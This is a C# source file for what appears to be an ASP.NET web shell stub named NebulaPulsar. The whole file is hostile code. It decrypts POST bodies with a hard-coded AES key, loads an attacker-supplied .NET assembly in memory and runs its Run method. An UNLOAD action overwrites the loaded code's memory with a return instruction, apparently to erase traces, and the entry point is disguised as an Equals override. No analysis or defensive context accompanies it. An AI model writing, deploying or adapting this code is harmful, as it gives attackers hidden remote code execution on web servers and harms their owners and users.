using System;
using System.Web;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.CompilerServices;
using System.Collections.Generic;

public class NebulaPulsar : MarshalByRefObject
{
    private static readonly string KEY = "NBPULSARDEADBEEF";
    private static Assembly _loadedCmdAssembly = null;

    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    public byte[] Crypt(byte[] abData, int nMode)
    {
        RijndaelManaged aes = new RijndaelManaged {
            Key = Encoding.UTF8.GetBytes(KEY),
            Mode = CipherMode.ECB,
            Padding = PaddingMode.PKCS7
        };
        
        ICryptoTransform transform = (nMode == 1) ? aes.CreateEncryptor() : aes.CreateDecryptor();

        return transform.TransformFinalBlock(abData, 0, abData.Length);
    }

    public override bool Equals(object obj)
    {
        HttpContext context = (HttpContext)obj;
        var response = context.Response;

        try
        {
            byte[] abEncryptedData = (byte[])context.Items["rawPostData"];
            byte[] abRawPayload = Crypt(abEncryptedData, 2);

            byte[] abLength = new byte[4];
            Buffer.BlockCopy(abRawPayload, 0, abLength, 0, 4);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(abLength);

            int nDllLength = BitConverter.ToInt32(abLength, 0);
            byte[] abDllBuffer = new byte[nDllLength];
            Buffer.BlockCopy(abRawPayload, 4, abDllBuffer, 0, nDllLength);

            int nParamOffset = nDllLength + 4;
            int nParamLength = abRawPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abRawPayload, nParamOffset, nParamLength).Trim();

            Dictionary<string, string> dic = fnParseParams(szParam);
            string szAction = dic["action"];
            if (szAction == "UNLOAD")
            {
                if (_loadedCmdAssembly != null)
                {
                    foreach (Type t in _loadedCmdAssembly.GetTypes())
                    {
                        MethodInfo methodToErase = t.GetMethod("Run");
                        if (methodToErase != null)
                        {
                            fnEraseMethodMemory(methodToErase);
                        }
                    }
                    
                    _loadedCmdAssembly = null;
                    context.Session.Remove("nebulapulsar");
                    
                    response.Write("PULSAR_INTERNAL_ERASE_SUCCESS");
                    return true;
                }
                response.Write("PULSAR_WARN: Nothing to erase.");
                return true;
            }

            _loadedCmdAssembly = Assembly.Load(abDllBuffer);

            Type targetType = null;
            foreach (Type t in _loadedCmdAssembly.GetTypes())
            {
                MethodInfo m = t.GetMethod("Run", new Type[] {});
                if (m != null)
                {
                    targetType = t;
                    break;
                }
            }

            if (targetType == null)
                targetType = _loadedCmdAssembly.GetTypes()[0];

            object instance = Activator.CreateInstance(targetType);
            context.Items["payload"] = abRawPayload;
            context.Items["len"] = nDllLength;
            context.Items["driver"] = this;

            MethodInfo method = targetType.GetMethod("Run", new Type[] { });
            if (method != null)
                method.Invoke(instance, null);
            else
                response.Write("ERROR: Cannot find Run.");
        }
        catch (Exception ex)
        {
            response.Write("INTERNAL_ERROR: " + ex.Message);
        }

        return true;
    }

    private static void fnEraseMethodMemory(MethodInfo method)
    {
        try
        {
            RuntimeHelpers.PrepareMethod(method.MethodHandle);
            IntPtr pMethodBody = method.MethodHandle.GetFunctionPointer();

            unsafe
            {
                byte* ptr = (byte*)pMethodBody.ToPointer();
                *ptr = 0xC3; // 0xC3 = RET (Intel instruction)
            }
        }
        catch
        {
            
        }
    }
}